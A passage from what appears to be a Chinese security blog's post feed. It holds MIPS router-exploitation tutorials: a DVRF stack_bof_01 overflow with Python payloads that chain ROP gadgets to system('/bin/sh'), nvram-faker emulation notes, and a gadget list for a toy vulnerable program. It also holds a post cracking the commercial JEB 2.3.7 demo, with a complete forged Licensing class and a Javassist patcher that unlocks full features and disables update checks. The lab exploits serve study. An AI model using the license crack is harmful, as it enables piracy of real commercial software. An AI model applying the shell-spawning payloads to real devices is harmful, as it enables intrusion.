0x40+var_28($sp)</div><div class="line">LOAD:00011BD8                 jr      $ra</div><div class="line">LOAD:00011BDC                 addiu   $sp, 0x40</div><div class="line">LOAD:00011BDC  # End of function scandir</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> 路由器安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mips rop </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一步一步pwn路由器之栈溢出实战]]></title>
      <url>//%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-27-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E6%88%98.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文以 <a href="https://github.com/praetorian-inc/DVRF" target="_blank" rel="external">DVRF</a> 中的第一个漏洞程序 <code>stack_bof_01</code> 为例，在实战 <code>MIPS</code> 架构中栈溢出的简单利用。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>去github上面把 DVRF 下载下来，然后用 <code>binwalk</code> 解开</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15090843759335sjlc5jz.png?imageslim" alt="paste image"></p>
<p>在 <code>pwnable</code> 目录下就是相应的示例程序</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509084462823wk11dwv2.png?imageslim" alt="paste image"><br>在解开的文件系统的根目录下使用 <code>chroot</code> 和 <code>qemu</code> 运行 程序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01  &quot;`cat ./pwnable/Intro/input`&quot;</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509084652810a9d812lx.png?imageslim" alt="paste image"></p>
<p>使用了<code>cat</code> 命令读取文件作为命令行参数，传给目标程序，这样可以使我们输入一些不可见字符用于劫持程序流。</p>
<p><code>stack_bof_01</code> 是一个很简单的栈溢出漏洞程序，它把用户从命令行传过去的参数直接使用 <code>strcpy</code> 拷贝到栈缓冲区，从而栈溢出。经过调试，输入204个字符后就可以覆盖到 <code>ra</code> 寄存器保存到栈栈上的值，进而可以控制 <code>$pc</code> 的值。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509085110075dfzfw3j4.png?imageslim" alt="paste image"><br>修改文件内容的 <code>python</code> 脚本如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line">padding = &quot;O&quot; * 204</div><div class="line">payload = padding + &quot;B&quot;*4</div><div class="line">with open(&quot;input&quot;, &quot;wb&quot;) as f:</div><div class="line">    f.write(payload)</div></pre></td></tr></table></figure>
<p>接下来就是考虑该如何利用的问题了。程序中包含了一个 执行 <code>system(&quot;/bin/sh&quot;)</code> 的函数 <code>dat_shell</code>, 如果是在 <code>x86</code> 平台下的话，我们直接设置 <code>$pc</code> 寄存器到它的地址就可以了。在 <code>MIPS</code> 如果直接指过去或怎么样呢？我们试试</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509085500227rnxajrt2.png?imageslim" alt="paste image"></p>
<p>访问了非法内存，异常了。<br>原因在于，在 MIPS 中，函数内部会通过 <code>$t9</code> 寄存器和 <code>$gp</code> 寄存器来找数据，地址等。同时在 <code>mips</code> 的手册内默认 <code>$t9</code> 的值为当前函数的开始地址，这样才能正常的索引，所以我们需要先用一个 <code>rop_gadget</code> 设置 <code>$t9</code>, 然后再跳到 <code>dat_shell</code> 函数。<br>在libc 中可以找到这样一个gadgets<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">.text:00006B20                 lw      $t9, arg_0($sp)</div><div class="line">.text:00006B24                 jalr    $t9</div></pre></td></tr></table></figure></p>
<p>加上libc的基地址就行了。用qemu-mipsel-static模拟程序是看不到目标程序的maps的，所以我们可以通过打印 <code>got</code> 表的函数指针，然后计算偏移得到 <code>libc</code> 的基地址。</p>
<p>所以我们现在的利用流程就是:</p>
<ul>
<li>修改返回地址到 <code>rop_gadget</code>, 设置 <code>$r9</code> 为 <code>dat_shell</code> 函数的地址</li>
<li>跳转到 <code>dat_shell</code> 函数，执行<code>system</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line">padding = &quot;O&quot; * 204</div><div class="line">gadget1 = &quot;\x20\xbb\x6e\x76&quot;</div><div class="line">dat_shell_addr = &quot;\x50\x09\x40&quot;  # Partial overwrite with little-endian arch</div><div class="line">payload = padding + gadget1 + dat_shell_addr</div><div class="line">with open(&quot;input&quot;, &quot;wb&quot;) as f:</div><div class="line">    f.write(payload)</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509086115477pcnvhh8c.png?imageslim" alt="paste image"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li><p>学习到了 <code>$t9</code> 寄存器的重要作用以后再使用 <code>rop</code> 调用函数时，要使用 <code>jalr $t9</code> 类的 <code>gadgets</code> 以保证进入函数后， <code>$t9</code> 的值为函数的起始地址，避免出错。</p>
</li>
<li><p>使用ida反汇编mips程序时，它好像默认  <code>$t9</code> 的值为函数的起始地址,导致我们分析问题时造成困惑，pwndbg 和 <a href="http://www.radare.org/r/" target="_blank" rel="external">radare2</a> 就不会这样。</p>
</li>
</ul>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509086721263tsioi5wr.png?imageslim" alt="paste image"></p>
<p>感觉mips下还是 pwndbg 和 <a href="http://www.radare.org/r/" target="_blank" rel="external">radare2</a>靠谱</p>
<p>参考链接：</p>
<ul>
<li><a href="https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-1/" target="_blank" rel="external">https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-1/</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> 路由器安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mips rop </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[破解 jeb  2.3.7 demo]]></title>
      <url>//jeb%E7%A0%B4%E8%A7%A3/2017-10-27-%E7%A0%B4%E8%A7%A3-jeb-2-3-7-demo.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>使用的技术和上文的一样。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><strong>安卓版</strong></p>
<p><code>jeb-2.3.7.201710262129-JEBDecompilerDemo-121820464987384338</code></p>
<p>重新编译一个 <code>com.pnfsoftware.jeb.client.Licensing</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div></pre></td><td class="code"><pre><div class="line">//</div><div class="line">// Source code recreated from a .class file by IntelliJ IDEA</div><div class="line">// (powered by Fernflower decompiler)</div><div class="line">//</div><div class="line"></div><div class="line">package com.pnfsoftware.jeb.client;</div><div class="line"></div><div class="line">import com.pnfsoftware.jeb.AssetManager;</div><div class="line">import com.pnfsoftware.jeb.util.format.Strings;</div><div class="line">import com.pnfsoftware.jeb.util.logging.GlobalLog;</div><div class="line">import com.pnfsoftware.jeb.util.logging.ILogger;</div><div class="line">import com.pnfsoftware.jebglobal.GN;</div><div class="line">import com.pnfsoftware.jebglobal.mW;</div><div class="line"></div><div class="line">public final class Licensing &#123;</div><div class="line">    private static final ILogger logger = GlobalLog.getLogger(Licensing.class);</div><div class="line">    public static final String user_email = &quot;love_lh@hac425.com&quot;;</div><div class="line">    public static final String user_group = &quot;hacker&quot;;</div><div class="line">    public static final int user_id = 2116188757;</div><div class="line">    public static final String user_name = &quot;hac425&quot;;</div><div class="line">    public static final int user_count = 20;</div><div class="line">    public static final int license_ts = 0;</div><div class="line">    public static final int license_validity = 40000;</div><div class="line">    public static int real_license_ts = 0;</div><div class="line">    public static int build_type = 0;</div><div class="line">    public static final int FLAG_AIRGAP = 8;</div><div class="line">    public static final int FLAG_ANYCLIENT = 16;</div><div class="line">    public static final int FLAG_COREAPI = 32;</div><div class="line">    public static final int FLAG_DEBUG = 1;</div><div class="line">    public static final int FLAG_FLOATING = 4;</div><div class="line">    public static final int FLAG_FULL = 2;</div><div class="line">    public static final int FLAG_JEB2 = 128;</div><div class="line"></div><div class="line"></div><div class="line">    static &#123;</div><div class="line">        int v0 = Licensing.build_type | 2;</div><div class="line">        Licensing.build_type = v0;</div><div class="line">        v0 |= 4;</div><div class="line">        Licensing.build_type = v0;</div><div class="line">        v0 |= 8;</div><div class="line">        Licensing.build_type = v0;</div><div class="line">        v0 |= 16;</div><div class="line">        Licensing.build_type = v0;</div><div class="line">        v0 |= 32;</div><div class="line">        Licensing.build_type = v0;</div><div class="line">        Licensing.build_type = v0 | 128;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">    public Licensing() &#123;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final void setLicenseTimestamp(int var0) &#123;</div><div class="line">        real_license_ts = 1505267330;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final int getExpirationTimestamp() &#123;</div><div class="line">        return real_license_ts + 345600000;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final int getBuildType() &#123;</div><div class="line">        return build_type;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isDebugBuild() &#123;</div><div class="line">        return true;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isReleaseBuild() &#123;</div><div class="line">        return !isDebugBuild();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isFullBuild() &#123;</div><div class="line">        return true;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isDemoBuild() &#123;</div><div class="line">        return !isFullBuild();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isFloatingBuild() &#123;</div><div class="line">        return (build_type &amp; 4) != 0;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isIndividualBuild() &#123;</div><div class="line">        return !isFloatingBuild();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isAirgapBuild() &#123;</div><div class="line">        return (build_type &amp; 8) != 0;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isInternetRequired() &#123;</div><div class="line">        return false;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean allowAnyClient() &#123;</div><div class="line">        return (build_type &amp; 16) != 0;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean canUseCoreAPI() &#123;</div><div class="line">        return true;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final String getBuildTypeString() &#123;</div><div class="line">        StringBuilder var0 = new StringBuilder();</div><div class="line">        if (isReleaseBuild()) &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;-119, 23, 9, 9, 4, 18, 22, 74&#125;, 1, 251));</div><div class="line">        &#125; else &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;35, 1, 7, 23, 18, 72&#125;, 1, 71));</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if (isFullBuild()) &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;37, 26, 28, 21, 93&#125;, 2, 39));</div><div class="line">        &#125; else &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;39, 10, 29, 22, 93&#125;, 2, 200));</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if (isFloatingBuild()) &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;-114, 10, 3, 14, 21, 29, 7, 9, 72&#125;, 1, 232));</div><div class="line">        &#125; else &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;42, 1, 20, 16, 4, 0, 3, 29, 21, 76, 7&#125;, 2, 150));</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if (isAirgapBuild()) &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;34, 6, 2, 84, 21, 8, 23, 71&#125;, 2, 100));</div><div class="line">        &#125; else &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;8, 23, 20, 92, 68, 7, 26, 17, 23, 28, 11, 17, 91&#125;, 1, 122));</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if (allowAnyClient()) &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;82, 15, 23, 84, 78, 15, 5, 12, 11, 26, 91&#125;, 1, 51));</div><div class="line">        &#125; else &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;-85, 9, 0, 15, 10, 10, 8, 13, 65, 78, 15, 5, 12, 11, 26, 91&#125;, 1, 196));</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if (canUseCoreAPI()) &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;32, 0, 2, 28, 95, 8, 23, 1&#125;, 2, 169));</div><div class="line">        &#125; else &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;-27, 1, 66, 78, 12, 29, 23, 72, 76, 17, 25&#125;, 1, 139));</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        return var0.toString();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static String getLicense() &#123;</div><div class="line">        byte[] var0 = AssetManager.UU(&quot;LICENSE.TXT&quot;);</div><div class="line">        return var0 == null ? null : Strings.decodeUTF8(var0);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static String getChangeList() &#123;</div><div class="line">        byte[] var0 = AssetManager.UU(&quot;CHANGELIST.TXT&quot;);</div><div class="line">        return var0 == null ? null : Strings.decodeUTF8(var0);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后patch掉退出函数和更新检测</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div></pre></td><td class="code"><pre><div class="line">package me.hacklh;</div><div class="line"></div><div class="line">import com.pnfsoftware.jeb.Launcher;</div><div class="line">import javassist.ClassPool;</div><div class="line">import javassist.CtClass;</div><div class="line">import javassist.CtMethod;</div><div class="line">import javassist.CtNewMethod;</div><div class="line">import com.pnfsoftware.jeb.client.Licensing;</div><div class="line"></div><div class="line"></div><div class="line">public class JebCracker &#123;</div><div class="line"></div><div class="line">    public static void main(String[] args) throws Exception &#123;</div><div class="line"></div><div class="line">//        com.pnfsoftware.jeb.installer.Launcher.main(new String[]&#123;&quot;--di&quot;&#125;);</div><div class="line">//        DES.main(args);</div><div class="line">//         Launcher.main(new String[]&#123;&quot;--generate-key&quot;&#125;);</div><div class="line">        CtClass.debugDump = &quot;./debugDump/&quot;;</div><div class="line"></div><div class="line">        System.out.println(Licensing.allowAnyClient());</div><div class="line"></div><div class="line">        /**</div><div class="line">         * 修改getStatus， AbstractContext会起几个线程修改status</div><div class="line">         */</div><div class="line">        ClassPool pool = ClassPool.getDefault();</div><div class="line">        pool.importPackage(&quot;com.pnfsoftware.jeb.client.AbstractContext&quot;);</div><div class="line">        CtClass old_class = pool.get(&quot;com.pnfsoftware.jeb.client.AbstractContext&quot;);</div><div class="line">        old_class.detach();</div><div class="line">        CtMethod old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;getStatus&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return 0;&quot;);</div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;terminate&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;;&quot;);</div><div class="line">        old_class.writeFile();</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">        /**</div><div class="line">         * patch 掉与网络下载有关的函数，禁止升级</div><div class="line">         */</div><div class="line">        pool = ClassPool.getDefault();</div><div class="line">        pool.importPackage(&quot;com.pnfsoftware.jeb.util.net.Net&quot;);</div><div class="line">        old_class = pool.get(&quot;com.pnfsoftware.jeb.util.net.Net&quot;);</div><div class="line">        old_class.detach();</div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line"></div><div class="line">                (</div><div class="line">                        &quot;downloadBinary&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                        pool.get(String.class.getName())</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return null;&quot;);</div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;httpPost&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                        pool.get(String.class.getName()),</div><div class="line">                                        pool.get(String.class.getName()),</div><div class="line">                                        pool.get(long[].class.getName())</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return null;&quot;);</div><div class="line">        old_class.writeFile();</div><div class="line"></div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509071049085jtzkc8nm.png?imageslim" alt="paste image"></p>
<p><strong>mips版</strong><br>类似</p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>可以在jeb的官网下载其他平台的适配包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.pnfsoftware.com/jeb2/support-package</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> jeb破解 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> jeb 2.3.7 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一步一步pwn路由器之路由器环境修复&&rop技术分析]]></title>
      <url>//%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-26-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8B%E8%B7%AF%E7%94%B1%E5%99%A8%E7%8E%AF%E5%A2%83%E4%BF%AE%E5%A4%8D-rop%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>拿到路由器的固件后，第一时间肯定是去运行目标程序，一般是web服务程序。我们可以去 <code>/etc/init.d/</code> 找启动文件，或者看看一些有可能的目录。一般来说路由器的程序很少的情况下是可以直接用qemu运行起来的。我们需要做一些修复的工作，本文会介绍一个常用的方法，后面会分析在 <code>mips uclibc</code> 中常用的 <code>rop</code> 手法。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><strong>运行环境修复</strong></p>
<p>由于路由器运行时会去 nvram中获取配置信息，而我们的qemu中是没有该设备，路由器中的程序可能会因为没法获取配置信息而退出。我们可以使用    <code>https://github.com/zcutlip/nvram-faker</code> 配合着设置 <code>LD_PRELOAD</code> 环境变量来使用( 类似于一种 <code>hook</code> )。如果你的mips交叉编译工具链和它脚本里面的不一样就要修改它的脚本，比如</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15090309370211cupr2kg.png?imageslim" alt="paste image"><br>编译后把 <code>libnvram-faker.so</code> 和 <code>nvram.ini</code> 放到 <code>/</code> 目录，然后使用 <code>LD_PRELOAD</code>来加载。即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo chroot . ./qemu-mips-static -E LD_PRELOAD=/libnvram-faker.so  /usr/bin/httpd</div></pre></td></tr></table></figure>
<p>如果程序还会在其他地方保错，就要自己分析程序，然后根据实际情况，在 <code>nvram-faker</code> 增加 <code>hook代码</code></p>
<p>注：</p>
<ul>
<li>要注意目标应用是用的 <code>glibc</code> 还是 <code>uclibc</code> ,从而选择对应的交叉编译工具链来进行编译。</li>
<li>先使用 <code>firmadyne</code> 运行看看，然后优先选择 <code>qemu-system-mips-static</code>来调试，实在不行用 <code>qemu-system</code></li>
<li>如果需要某些静态编译（给生成的Makefile里面增加 <code>-static</code> 选项）的程序，建议去 <code>qemu-system</code> 编译，交叉编译太麻烦了。</li>
</ul>
<hr>
<p><strong>MIPS ROP分析</strong></p>
<p>看了 <a href="http://www.devttys0.com/2012/10/exploiting-a-mips-stack-overflow/" target="_blank" rel="external">Exploiting a MIPS Stack Overflow</a> 做的实验，因为    <code>tplink</code>上没有对应版本的固件了。于是只能自己写一个栈溢出的程序，并配合着gdb调试，来模拟整个rop过程。</p>
<p>代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;  </div><div class="line">#include &lt;stdlib.h&gt;  </div><div class="line">#include &lt;unistd.h&gt;  </div><div class="line"></div><div class="line"></div><div class="line">void getshell()&#123;</div><div class="line">    system(&quot;sh&quot;);</div><div class="line">    sleep(1);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void vulnerable_function() &#123;  </div><div class="line">    char buf[128]; </div><div class="line">    read(STDIN_FILENO, buf, 256);  </div><div class="line">&#125;  </div><div class="line">   </div><div class="line">int main(int argc, char** argv) &#123; </div><div class="line">	printf(&quot;%p\n&quot;, (int *)write); </div><div class="line">    vulnerable_function();  </div><div class="line">    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);  </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>因为要使用 <code>qemu-mips-static</code> 来调试程序，这样就不方便找到libc的基地址。于是在程序运行时把libc中的函数地址打印出来，然后计算基地址，便于我们找到gadgets具体在内存中的位置。然后使用 uclibc的交叉编译工具链来编译。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/home/haclh/router_exploit/cross-compiler-mips/bin/mips-gcc level1.c -o level1</div></pre></td></tr></table></figure></p>
<p>把它扔到一个路由器文件系统目录中，这样就不用单独拷贝它依赖的lib了。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15090326039915db83l6b.png?imageslim" alt="paste image"></p>
<p>可以看到程序使用了 uClibc，通过查看qemu的maps，找到uClibc的路径<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15090327179167od9lz52.png?imageslim" alt="paste image"></p>
<p>拿到ida中分析找 gadgets.具体可以看上面的那篇文章。找到的gadgets如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">rop_gad1:</div><div class="line">	LOAD:00055C60                 li      $a0, 1</div><div class="line">	LOAD:00055C64                 move    $t9, $s1</div><div class="line">	LOAD:00055C68                 jalr    $t9 ; sub_55960</div><div class="line">	LOAD:00055C5C                 lui     $s0, 2</div><div class="line"></div><div class="line">gadg_2</div><div class="line"></div><div class="line">	LOAD:0001E20C                 move    $t9, $s1</div><div class="line">	LOAD:0001E210                 lw      $ra, 0x28+var_4($sp)</div><div class="line">	LOAD:0001E214                 lw      $s2, 0x28+var_8($sp)</div><div class="line">	LOAD:0001E218                 lw      $s1, 0x28+var_C($sp)</div><div class="line">	LOAD:0001E21C                 lw      $s0, 0x28+var_10($sp)</div><div class="line">	LOAD:0001E220                 jr      $t9</div><div class="line">	LOAD:0001E224                 addiu   $sp, 0x28</div><div class="line"></div><div class="line"></div><div class="line">rop_gad3:</div><div class="line">	LOAD:000164C0                 addiu   $s2, $sp, 0x198+var_180</div><div class="line">	LOAD:000164C4                 move    $a2, $v1</div><div class="line">	LOAD:000164C8                 move    $t9, $s0</div><div class="line">	LOAD:000164CC                 jalr    $t9 ; mempcpy</div><div class="line">	LOAD:000164D0                 move    $a0, $s2</div><div class="line"></div><div class="line"></div><div class="line">rop_gad4:</div><div class="line">	LOAD:000118A4                 move    $t9, $s2</div><div class="line">	LOAD:000118A8                 jalr    $t9</div></pre></td></tr></table></figure></p>
